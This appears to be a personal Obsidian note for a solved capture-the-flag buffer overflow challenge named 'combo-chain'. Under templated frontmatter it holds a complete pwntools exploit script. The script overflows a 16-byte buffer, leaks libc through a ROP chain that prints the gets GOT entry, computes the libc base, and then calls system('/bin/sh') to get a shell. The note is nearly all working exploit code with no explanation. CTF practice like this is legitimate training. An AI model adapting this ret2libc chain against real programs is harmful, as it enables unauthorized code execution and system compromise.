---
type: challenge
event: <% tp.user.grandparent(tp) %>
name: <% tp.file.title %>
category: <% tp.file.folder(0) %>
note: "[[Binary Exploitation#Buffer overflow]]"
solved: ✅
---


```python
from pwn import *

p = process("./combo-chain")
e = ELF('./combo-chain')
libc = ELF("/usr/lib/libc.so.6")

popRdi = p64(0x401263)
main = p64(0x4011a4)

plt_gets = p64(e.plt["gets"])
plt_printf = p64(e.plt["printf"])
got_gets = p64(e.got["gets"])
ret = p64(0x4011f4)

payload = b"A" * 16 + ret + popRdi + got_gets + plt_printf + main

p.recvuntil(b": ")
p.sendline(payload)

smth = p.recvuntil(": ").split(b"Dude")
libc_address = int.from_bytes(smth[0], 'little') - libc.symbols["gets"]
libc.address = libc_address
log.success(f"Libc Base: {hex(libc_address)}")

system = p64(libc.symbols["system"])
binsh = p64(next(libc.search(b"/bin/sh")))

payload = b"A" * 16 + popRdi + binsh + system
p.sendline(payload)

gdb.attach(p, gdbscript='''
    init-gef
    echo "--- CHECKING LIBC BASE ---"
    vmmap libc
''')

p.interactive()
```